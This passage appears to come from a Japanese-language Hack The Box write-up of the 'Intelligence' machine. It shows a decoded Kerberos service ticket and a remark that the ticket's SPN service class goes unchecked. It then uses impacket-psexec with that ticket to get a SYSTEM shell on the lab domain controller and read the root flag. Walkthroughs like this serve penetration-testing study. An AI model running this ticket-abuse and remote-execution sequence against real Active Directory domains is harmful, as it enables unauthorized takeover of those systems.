152d15f3f1071b855dee1843a4c1a1ee9ae24f11f6dd3a29fa137ebbdc957fb821c596201702c7f31983f4bff400dc4c85f1e9b97d2c8eaae2208b1e7250c2a0203c25165acbcf21efe01c0f21233739b7c11f8313c566991814c82fc9521ac253f78d4fef35877b9d4a9555c3a4d6dfbfd8807055cb6c739250e4219751a25ef2e333652a2751c6321f77794a29c330cba095f88f79c45070d895e7ef339252717ca2f70a73498dd57f41277f84bc8cc108324daa1c1c92a04fc9af05860f9d308863b4ed7821fc8b7c8723156b14cb783d701f830b9f709242cfe2b080394edeb9eea26b9ace0a649d03136e0295d349b5cdb2ccdc6a1ea7e74fd8aee13495dd8e5d482326a8fdc31290b145269369e2f0024464ea1d98814319bca278ee733a021bf83fbafda99db4d939ccaa781c026e989e412f5fe164a254ce0fabf1ce79a97e261c8f7888eed245e654a4e24d5338401fe9aabf6d5f3ea6b244d984e3c162791f6fa5b39d9864d308a9b33599113c6b100e665644613236da2c8b2cbb580f7800dde159af9fc52ec47acd0d04b476d351c0e5468f29e913aa132a9510471510bb19eed8498d1bce0987168ef6500a17c4ae7a61bd91c15588f92772533c4d5b68fc0a7dc1ed23398116ac3939a25f2f245f0e392eb01791637bd5b757e032ca49c06c45f603b7a4d3af5b192a0094cd8c1e97d2bb707f120bb40587c36bb10c6c3266acdc8ab14a664be4723cf882d2ed34d88192f739f3f4a0e1167f24b4f820e130bfcf895b1d43947a3fb594be3cfdf0f64f0a881530242b8f39a0a1ecafd2f9e2d769a17c5ebfdb65f389ec99f633232f13e69598b7678008f4325d849857365ede2fb2a0376f071cc9fc4b08b36ae9e7e8af21d0c360272ca08f313d2136aedc1e6a6fc29f24e5c416e7fefdbba7cfc6e6d7b5568a25c6cf69f705d3be54c2e6d1007be4254e1d95ef2ea502bf8492bbe25210432b3644e25ee740e4789194230ca4d2185d34d862d09e062d9116df6f84bc535a814bd7a45b6d9673c9a5b5bc76bfa5a15310206d2262cd3e870ddde52570b77c4d758140105e8958eaa8b5da1d6c03e8de0b507819fcd8df7159db8133e1e81dd4aee3e84d372efe700c2ed53dddb395f1ad75239d91621c549b7c6401b3954
[*] Decoding unencrypted data in credential[0]['ticket']:
[*]   Service Name                : WWW/dc.intelligence.htb
[*]   Service Realm               : INTELLIGENCE.HTB
[*]   Encryption type             : aes256_cts_hmac_sha1_96 (etype 18)
[-] Could not find the correct encryption key! Ticket is encrypted with aes256_cts_hmac_sha1_96 (etype 18), but no keys/creds were supplied
```
spnのサービスクラスが「www」のtgsを取得したため、通常は80番に対するアクセスが可能だと思うが実際は異なる  
[リンク](https://www.thehacker.recipes/ad/movement/kerberos/relay#theory)で確認できるとおり、tgsは復号までしか確認されずspnのサービスクラスは確認されないらしい  
ということでpsexec、ルートフラグゲット
```sh
└─$ export KRB5CCNAME=administrator@WWW_dc.intelligence.htb@INTELLIGENCE.HTB.ccache

└─$ impacket-psexec -k -target-ip 10.129.95.154 'dc.intelligence.htb' 
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Requesting shares on 10.129.95.154.....
[*] Found writable share ADMIN$
[*] Uploading file dkONiIjk.exe
[*] Opening SVCManager on 10.129.95.154.....
[*] Creating service GuSs on 10.129.95.154.....
[*] Starting service GuSs.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.17763.1879]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32> type c:\users\administrator\desktop\root.txt
b6e0354c00236a39e5b2f5cc5a462a75
```
